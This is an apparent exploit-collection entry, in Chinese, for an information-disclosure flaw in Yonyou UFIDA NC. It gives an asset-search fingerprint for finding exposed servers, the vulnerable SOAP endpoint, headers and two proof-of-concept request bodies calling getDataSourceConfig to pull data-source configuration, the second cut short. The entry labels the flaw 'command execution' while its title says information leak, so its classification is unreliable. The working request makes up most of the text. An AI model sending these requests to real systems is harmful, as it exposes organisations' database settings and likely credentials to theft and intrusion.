# 用友UFIDANCgetDataSourceConfig存在信息泄露漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="用友 UFIDA NC"`
- **请求**：`POST /uapws/service/nc.itf.ses.inittool.SESInitToolService HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=57CC01E2D28AFE5F2A476BFF030D601A.ncServer; JSESSIONID=95BB77917927DCB…`　`SOAPAction: urn:getDataSourceConfig`　`Content-Type: text/xml;charset=UTF-8`　`Host: xx.xx.xx.xx`　`Content-Length: 245`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ses="http://inittool.ses.itf.nc/SESInitToolService">
<soapenv:Header/>
<soapenv:Body>
<ses:getDataSourceConfig/>
</soapenv:Body>
</soapenv:Envelope>

POC2
POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
Cookie: JSESSIONID=A957970D435ACE12928741F2456B7644.ncServer; JSESSIONID=95BB77917927DCB24E2A01BDD1AB6CC1.ncServer
SOAPAction: urn:getDataSourceConfig
Content-Type: text/xml;charset=UTF-8
Host: xx.xx.xx.xx
Content-Length: 251
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/so…（脚本共 774 字，完整版见原文）
```

**其他**
- 用友UFIDA NC getDataSourceConfig存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友UFIDA NC